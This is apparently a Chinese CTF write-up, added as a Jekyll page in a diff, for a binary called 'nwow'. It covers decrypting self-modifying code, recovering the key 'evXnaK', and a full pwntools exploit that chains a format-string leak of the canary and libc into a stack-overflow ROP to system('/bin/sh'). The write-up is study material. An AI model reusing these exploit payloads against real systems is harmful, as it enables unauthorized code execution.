@@ -1,0 +1,379 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>20180603</title>
+  <meta name="description" content="0x00 前言">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="http://localhost:4000/jekyll/update/2019/01/02/20180603.html">
+  <link rel="alternate" type="application/rss+xml" title="Your awesome title" href="http://localhost:4000/feed.xml">
+</head>
+
+
+  <body>
+
+    <header class="site-header">
+
+  <div class="wrapper">
+
+    <a class="site-title" href="/">Your awesome title</a>
+
+    <nav class="site-nav">
+      <a href="#" class="menu-icon">
+        <svg viewBox="0 0 18 15">
+          <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
+          <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
+          <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
+        </svg>
+      </a>
+
+      <div class="trigger">
+        
+          
+          <a class="page-link" href="/about/">About</a>
+          
+        
+          
+        
+          
+        
+          
+        
+      </div>
+    </nav>
+
+  </div>
+
+</header>
+
+
+    <div class="page-content">
+      <div class="wrapper">
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title" itemprop="name headline">20180603</h1>
+    <p class="post-meta"><time datetime="2019-01-02T21:01:05+08:00" itemprop="datePublished">Jan 2, 2019</time></p>
+  </header>
+
+  <div class="post-content" itemprop="articleBody">
+    <h1 id="0x00">0x00 前言</h1>
+
+<p>总之这题很蛋疼。。。做起来很难受，没见过这种题。。可能是我题做得少？</p>
+
+<h1 id="0x01-smc">0x01 根据输入SMC</h1>
+
+<p>首先进来看到<code class="prettyprint">main</code>，输出完之后有这么一个常见混淆。。。</p>
+
+<p>大概就是短<code class="prettyprint">call</code>然后pop出当前地址，再<code class="prettyprint">+7</code>，加完之后<code class="prettyprint">rax</code>刚好是<code class="prettyprint">jmp rax</code>的下一条指令，不细说，不知道的可以跟一下（nop掉0x400749处的反调试）</p>
+<div class="highlight"><pre><code class="language-assembly" data-lang="assembly">.text:000000000040080C                 call    $+5
+.text:0000000000400811 L_64:
+.text:0000000000400811                 pop     rax
+.text:0000000000400812                 add     rax, 7
+.text:0000000000400816                 jmp     rax
+</code></pre></div>
+<p>接着会先把代码段设为可写然后读6个字节。。。</p>
+<div class="highlight"><pre><code class="language-assembly" data-lang="assembly">.text:0000000000400818                 sar     rax, 0Ch
+.text:000000000040081C                 shl     rax, 0Ch
+.text:0000000000400820                 mov     rdi, rax
+.text:0000000000400823                 mov     rdx, 7
+.text:000000000040082A                 mov     rax, 0Ah
+.text:0000000000400831                 mov     rsi, 1000h
+.text:0000000000400838                 syscall                 ; LINUX - sys_mprotect
+.text:000000000040083A                 xor     rax, rax
+.text:000000000040083D                 mov     rdx, 6
+.text:0000000000400844                 push    rax
+.text:0000000000400845                 lea     rax, szCh
+.text:000000000040084D                 mov     rsi, rax
+.text:0000000000400850                 pop     rax
+.text:0000000000400851                 mov     rdi, rax
+.text:0000000000400854                 syscall                 ; LINUX - read
+.text:0000000000400856                 call    $+5
+.text:000000000040085B L0_64:
+.text:000000000040085B                 pop     rax
+.text:000000000040085C                 add     rax, 24h ; rax指向0x40085B+0x24=0x40087F
+.text:0000000000400860                 xor     rcx, rcx
+.text:0000000000400863                 mov     dl, [rsi+rcx] ; 拿第一个输入
+.text:0000000000400866
+.text:0000000000400866 L1_64:                                  ; CODE XREF: 
+.text:0000000000400866                 mov     bl, [rax+rcx]
+.text:0000000000400869                 xor     bl, dl
+.text:000000000040086B                 mov     [rax+rcx], bl ; SMC 异或
+.text:000000000040086E                 mov     dh, [rax+rcx-1]
+.text:0000000000400872                 inc     rcx
+.text:0000000000400875                 cmp     dh, 0FBh
+.text:0000000000400878                 jz      short L1_64
+.text:000000000040087A                 cmp     bl, 90h
+.text:000000000040087D                 jnz     short L1_64 ; 终止条件是直到一个nop且前一个字节不为fb
+.text:000000000040087F                 sub     eax, 2D6D61E8h ; 待解密
+.text:0000000000400884                 db      48h
+.text:0000000000400884                 in      rax, 65h
+</code></pre></div>
+<p>所以这个单字节是不知道的，我们要猜。随便输的话解密失败明显出来乱七八糟的指令，跑一会就segfault了，所以不觉得这种乱指令能getshell。</p>
+
+<p>那么怎么知道这个值是多少呢，当然要从<code class="prettyprint">0-255</code>跑一遍，然后看哪个是不是乱指令。如何判断？在Pwntool中有个<code class="prettyprint">disasm</code>，可以反汇编。然后如果有无法识别的指令会是<code class="prettyprint">(bad)</code>，所以，就把这些字节先用IDAPython给dump出来，然后解密，然后看谁没有<code class="prettyprint">(bad)</code>（最后用的是这种方法），或者说谁的<code class="prettyprint">(bad)</code>位置比较在后面（前面先用这个测试的），这基本可以过滤一堆了，最后需要人肉再从这十多个里面找到正确的。</p>
+
+<p>是不是一股crypto和misc的破解xor的味道。。。</p>
+
+<p>具体代码如下</p>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="k">def</span> <span class="nf">xor</span><span class="p">(</span><span class="n">arr</span><span class="p">,</span> <span class="n">k</span><span class="p">):</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">arr</span><span class="p">)):</span>
+        <span class="n">ret</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">arr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">k</span><span class="p">))</span>
+    <span class="k">return</span> <span class="s">""</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
+
+<span class="n">bad_idx</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">256</span><span class="p">):</span>
+    <span class="n">asm</span> <span class="o">=</span> <span class="n">disasm</span><span class="p">(</span><span class="n">xor</span><span class="p">(</span><span class="n">enc</span><span class="p">,</span> <span class="n">k</span><span class="p">),</span> <span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span><span class="p">)</span> <span class="c">#enc是加密的代码字节，太长不贴了</span>
+    <span class="n">bad_idx</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">asm</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s">"(bad)"</span><span class="p">))</span>
+<span class="k">print</span> <span class="n">bad_idx</span>
+<span class="n">m</span> <span class="o">=</span> <span class="nb">max</span><span class="p">(</span><span class="n">bad_idx</span><span class="p">)</span>
+<span class="c">#print map(hex, [i for i, j in enumerate(bad_idx) if j == m])</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">256</span><span class="p">):</span>
+    <span class="k">if</span> <span class="n">bad_idx</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">&gt;</span><span class="mi">1000</span><span class="p">:</span> <span class="c"># 找bad_idx比较靠后的，1000是慢慢试出来的</span>
+        <span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="s">":"</span>
+        <span class="k">print</span> <span class="n">disasm</span><span class="p">(</span><span class="n">xor</span><span class="p">(</span><span class="n">enc</span><span class="p">,</span> <span class="n">i</span><span class="p">),</span> <span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span><span class="p">)[:</span><span class="mi">256</span><span class="p">]</span>
+        <span class="k">print</span> <span class="s">"</span><span class="se">\n\n</span><span class="s">"</span>
+</code></pre></div>
+<p>然后这个方法其实不是最好的，最好的是这样的。。。（加上break条件限制）</p>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">decrypt_fb90</span><span class="p">(</span><span class="n">arr</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="k">while</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">arr</span><span class="p">):</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">arr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span>
+        <span class="n">ret</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">&gt;=</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">ret</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">!=</span> <span class="mh">0xfb</span> <span class="ow">and</span> <span class="n">r</span> <span class="o">==</span> <span class="mh">0x90</span><span class="p">):</span>
+            <span class="k">break</span>
+        <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="k">return</span> <span class="s">""</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="nb">chr</span><span class="p">,</span><span class="n">ret</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">find_correct_key</span><span class="p">(</span><span class="n">enc</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">256</span><span class="p">):</span>
+        <span class="n">asm</span> <span class="o">=</span> <span class="n">disasm</span><span class="p">(</span><span class="n">decrypt_fb90</span><span class="p">(</span><span class="n">enc</span><span class="p">,</span> <span class="n">k</span><span class="p">),</span> <span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">asm</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s">"(bad)"</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span> <span class="c"># 解密后的代码找不到错误指令</span>
+            <span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
+            <span class="k">print</span> <span class="n">asm</span>
+            <span class="k">print</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span>
+<span class="n">find_correct_key</span><span class="p">(</span><span class="n">enc</span><span class="p">)</span>
+</code></pre></div>
+<p>然后就是慢慢撸，最后发现正确的key是0x65</p>
+
+<p>解密之后发现又是一个类似的东西，只不过他会先把前面的代码xor加密掉（没啥意义，不知道干嘛的）</p>
+
+<p>然后后面不是直接拿输入解密的，是把输入xor上前一个的key作为新的key，一共有好几段这样的代码，随便贴其中一个（都长得一样的好像）</p>
+<div class="highlight"><pre><code class="language-assembly" data-lang="assembly">.text:000000000040087F                 lea     rax, [rax+rcx]
+.text:0000000000400883                 sub     rax, 80h
+.text:0000000000400889                 xor     rcx, rcx
+.text:000000000040088C
+.text:000000000040088C snd_phase:                              ; CODE XREF:
+.text:000000000040088C                 mov     bl, [rax+rcx]
+.text:000000000040088F                 xor     bl, dl
+.text:0000000000400891                 mov     [rax+rcx], bl
+.text:0000000000400894                 inc     rcx
+.text:0000000000400897                 cmp     rcx, 20h
+.text:000000000040089B                 jl      short snd_phase ; 这个循环加密前面的代码
+.text:000000000040089D                 add     rax, 80h
+.text:00000000004008A3                 xor     rcx, rcx
+.text:00000000004008A6                 mov     dl, [rsi+rcx]
+.text:00000000004008A9                 inc     rsi
+.text:00000000004008AC                 xor     dl, [rsi+rcx]  ; 新key
+.text:00000000004008AF
+.text:00000000004008AF L2_64:                                  ; CODE XREF:
+.text:00000000004008AF                                         ; .text:00000000004008C6↓j
+.text:00000000004008AF                 mov     bl, [rax+rcx]
+.text:00000000004008B2                 xor     bl, dl
+.text:00000000004008B4                 mov     [rax+rcx], bl
+.text:00000000004008B7                 mov     dh, [rax+rcx-1]
+.text:00000000004008BB                 inc     rcx
+.text:00000000004008BE                 cmp     dh, 0FBh
+.text:00000000004008C1                 jz      short L2_64
+.text:00000000004008C3                 cmp     bl, 90h
+.text:00000000004008C6                 jnz     short L2_64
+.text:00000000004008C8                 nop
+</code></pre></div>
+<p>然后解密用的是IDAPython，这个网上有教程，不说了。。</p>
+
+<p>最后一段（解密漏洞代码）好像没有<code class="prettyprint">0FBh</code>这个限制了，不知道为啥，好像没区别，不过这个限制有啥用啊。。。不懂。。。希望出题人来解释下。。。</p>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">decrypt_fb90</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
+    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">Byte</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span> <span class="o">^</span> <span class="n">key</span>
+        <span class="n">PatchByte</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">r</span><span class="p">)</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">Byte</span><span class="p">(</span><span class="n">addr</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="mh">0xfb</span> <span class="ow">and</span> <span class="n">r</span> <span class="o">==</span> <span class="mh">0x90</span><span class="p">):</span>
+            <span class="k">break</span>
+        <span class="n">addr</span> <span class="o">+=</span> <span class="mi">1</span>
+    <span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">decrypt_xor</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">num</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">num</span><span class="p">):</span>
+        <span class="n">PatchByte</span><span class="p">(</span><span class="n">addr</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="n">Byte</span><span class="p">(</span><span class="n">addr</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">^</span> <span class="n">key</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">dump_bytes</span><span class="p">(</span><span class="n">beg</span><span class="p">,</span> <span class="n">end</span><span class="p">):</span>
+    <span class="n">ret</span> <span class="o">=</span> <span class="s">"["</span>
+    <span class="k">for</span> <span class="n">p</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="n">beg</span><span class="p">,</span> <span class="n">end</span><span class="p">):</span>
+        <span class="n">ret</span> <span class="o">+=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">Byte</span><span class="p">(</span><span class="n">p</span><span class="p">))</span> <span class="o">+</span> <span class="s">","</span>
+    <span class="k">print</span> <span class="n">ret</span>
+    <span class="k">return</span> <span class="n">ret</span>
+</code></pre></div>
+<p>最后解出来6个字节如下</p>
+<div class="highlight"><pre><code class="language-" data-lang="">1 key:0x65 =&gt; e
+2 key:0x13 ^0x65 =&gt; v
+3 key:0x4b ^0x13 =&gt; X
+4 key:0x25 ^0x4b =&gt; n
+5 key:0x44 ^0x25 =&gt; a
+6 key:0x0f ^0x44 =&gt; K
+=&gt; evXnaK
+</code></pre></div>
+<h1 id="0x02">0x02 漏洞</h1>
+
+<p>所以这题其实是5分crypto，3分逆向，2分pwn（至少我花的时间差不多是这样，可能是我misc做的不熟）</p>
+
+<p>漏洞其实很简单了。。。</p>
+<div class="highlight"><pre><code class="language-assembly" data-lang="assembly">.text:00000000004009FA                 mov     rax, 1
+.text:0000000000400A01                 mov     rdx, 5
+.text:0000000000400A08                 lea     rsi, szCh2      ; "wow!\n"
+.text:0000000000400A10                 mov     rdi, rax
+.text:0000000000400A13                 syscall                 ; LINUX - sys_write
+.text:0000000000400A15                 mov     edi, 0
+.text:0000000000400A1A                 call    _fflush
+.text:0000000000400A1F                 cmp     rax, rax
+.text:0000000000400A22
+.text:0000000000400A22 L_J0:
+.text:0000000000400A22                 jnz     short near ptr loc_400A33+3
+.text:0000000000400A24                 call    $+5
+.text:0000000000400A29
+.text:0000000000400A29 L_J1:
+.text:0000000000400A29                 pop     rax
+.text:0000000000400A2A                 add     rax, 7
+.text:0000000000400A2E                 jmp     rax
+.text:0000000000400A30                 xor     rax, rax
+.text:0000000000400A33
+.text:0000000000400A33 loc_400A33:                             ; CODE XREF: .text:L_J0↑j
+.text:0000000000400A33                 mov     rdx, 1Ah
+.text:0000000000400A3A                 mov     rsi, rsp
+.text:0000000000400A3D                 mov     ds:lpGoble, rsp
+.text:0000000000400A45                 mov     rdi, rax
+.text:0000000000400A48                 syscall                 ; LINUX - sys_read
+.text:0000000000400A4A                 mov     rax, cs:lpGoble
+.text:0000000000400A51                 mov     rdi, rax
+.text:0000000000400A54                 mov     eax, 0
+.text:0000000000400A59                 call    _printf         ; 栈中格式化字符串漏洞
+.text:0000000000400A5E                 xor     rax, rax
+.text:0000000000400A61                 mov     rdx, 200h
+.text:0000000000400A68                 lea     rsi, [rsp-20h]
+.text:0000000000400A6D                 mov     rdi, rax
+.text:0000000000400A70                 syscall                 ; read，栈溢出
+.text:0000000000400A72                 nop
+</code></pre></div>
+<p>首先<code class="prettyprint">&quot;%13$lxAAA%8$sBB\x00&quot; + p64(prog.got[&quot;puts&quot;])</code>可以leak出canary和libc，具体这个位置怎么确定的调一下就知道了。。。</p>
+
+<p>然后栈溢出，可以覆盖到返回地址，具体payload如下</p>
+
+<p><code class="prettyprint">p64(canary)*(0x68/8) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr) + p64(0)</code></p>
+
+<p>因为懒得确定canary的位置直接padding全放成canary了，然后ROP，<code class="prettyprint">/bin/sh</code>是在libc里面就有的字符串，<code class="prettyprint">pop rdi</code>是在源程序里面找的，返回地址设成了0，这个倒是无所谓。0x68怎么确定的也是调一下就好了。。</p>
+
+<p>完整exp</p>
+<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">g_local</span><span class="o">=</span><span class="bp">True</span>
+<span class="n">prog</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./nwow'</span><span class="p">)</span>
+<span class="c">#context.log_level='debug'</span>
+<span class="k">if</span> <span class="n">g_local</span><span class="p">:</span>
+    <span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"/lib/x86_64-linux-gnu/libc-2.23.so"</span><span class="p">)</span>
+    <span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'./nwow'</span><span class="p">)</span><span class="c">#env={'LD_PRELOAD':'./libc.so.6'}</span>
+    <span class="c">#gdb.attach(sh)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"139.199.99.130"</span><span class="p">,</span> <span class="mi">65188</span><span class="p">)</span>
+
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"***************************</span><span class="se">\n\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"***************************</span><span class="se">\n\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"***************************</span><span class="se">\n\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"***************************</span><span class="se">\n\n</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"evXnaK"</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"wow!</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"</span><span class="si">%13</span><span class="s">$lxAAA</span><span class="si">%8</span><span class="s">$sBB</span><span class="se">\x00</span><span class="s">"</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">prog</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">"puts"</span><span class="p">]))</span>
+
+<span class="n">canary</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"AAA"</span><span class="p">)</span>
+<span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">==</span> <span class="mi">16</span> <span class="o">+</span> <span class="mi">3</span>
+<span class="n">canary</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">canary</span><span class="p">[:</span><span class="mi">16</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span>
+
+<span class="n">puts_leak</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"BB"</span><span class="p">)</span>
+<span class="k">print</span> <span class="n">puts_leak</span>
+<span class="k">print</span> <span class="nb">len</span><span class="p">(</span><span class="n">puts_leak</span><span class="p">)</span>
+<span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">puts_leak</span><span class="p">)</span> <span class="o">==</span> <span class="mi">6</span> <span class="o">+</span> <span class="mi">2</span>
+<span class="n">puts_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">puts_leak</span><span class="p">[:</span><span class="mi">6</span><span class="p">]</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x00\x00</span><span class="s">"</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">puts_leak</span> <span class="o">-</span> <span class="n">e</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"puts"</span><span class="p">]</span>
+<span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="n">e</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">]</span>
+<span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">libc</span> <span class="o">+</span> <span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span><span class="p">)))</span>
+<span class="k">print</span> <span class="s">"canary: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
+<span class="k">print</span> <span class="s">"puts: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">puts_leak</span><span class="p">)</span>
+<span class="k">print</span> <span class="s">"libc: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>
+<span class="k">print</span> <span class="s">"bin/sh: "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span>
+<span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x400b23</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="mh">0x68</span><span class="o">/</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
+
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+  </div>
+
+</article>
+
+      </div>
+    </div>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Your awesome title</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li>Your awesome title</li>
+          <li><a href="mailto:your-email@domain.com">your-email@domain.com</a></li>
+        </ul>
+      </div>
+
+      <div class="footer-col footer-col-2">
+        <ul class="social-media-list">
+          
+          <li>
+            <a href="https://github.com/jekyll"><span class="icon icon--github"><svg viewBox="0 0 16 16"><path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/></svg>
+</span><span class="username">jekyll</span></a>
+
+          </li>
+          
+
+          
+          <li>
+            <a href="https://twitter.com/jekyllrb"><span class="icon icon--twitter"><svg viewBox="0 0 16 16"><path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"/></svg>
+</span><span class="username">jekyllrb</span></a>
+
+          </li>
+          
+        </ul>
+      </div>
+
+      <div class="footer-col footer-col-3">
+        <p>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.
+</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+
+
+  </body>
+
+</html>
